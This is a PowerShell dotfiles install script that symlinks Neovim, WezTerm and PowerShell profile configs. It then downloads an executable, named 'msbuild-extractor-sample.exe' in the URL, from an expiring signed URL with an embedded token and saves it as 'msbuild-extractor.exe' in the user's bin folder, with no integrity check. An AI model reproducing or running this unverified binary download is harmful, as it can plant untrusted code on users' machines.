

Push-Location "$PSScriptRoot"

Write-Host "Install nvim config"
New-Item -ItemType SymbolicLink -Path "$env:LOCALAPPDATA\nvim\init.lua" -Target "nvim\init.lua"

Write-Host "Install wezterm config"
New-Item -ItemType SymbolicLink -Path "$env:USERPROFILE\.wezterm.lua" -Target "wezterm\.wezterm.lua"

Write-Host "Install powershell profile"

$ProfileDirectory = Split-Path -Path $PROFILE -Parent
New-Item -Path $ProfileDirectory -ItemType Directory -Recurse -Force | Out-Null
New-Item -ItemType SymbolicLink -Path "$PROFILE" -Target "powershell\profile.ps1"

$UserBin = "$env:USERPROFILE\bin"

New-Item -Path $UserBin -ItemType Directory -Recurse -Force | Out-Null

Invoke-WebRequest -Uri "https://release-assets.githubusercontent.com/github-production-release-asset/1206161626/ca9db372-286c-404b-8ddc-ff9fe1124cb5?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-11-03T12%3A04%3A23Z&rscd=attachment%3B+filename%3Dmsbuild-extractor-sample.exe&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-11-03T11%3A03%3A31Z&ske=2026-11-03T12%3A04%3A23Z&sks=b&skv=2018-11-09&sig=7lb0xHCyNNLdXIJSYNTi5l5a7iNrpcn5x8DZMuIvJ7c%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc5MzcwNTYxMiwibmJmIjoxNzkzNzAzODEyLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.c1ZbuID3gyB3aQphbsM1dfFPkkKfpwToVymo0FhpCAU&response-content-disposition=attachment%3B%20filename%3Dmsbuild-extractor-sample.exe&response-content-type=application%2Foctet-stream" `
  -OutFile "$UserBin\msbuild-extractor.exe"

Pop-Location
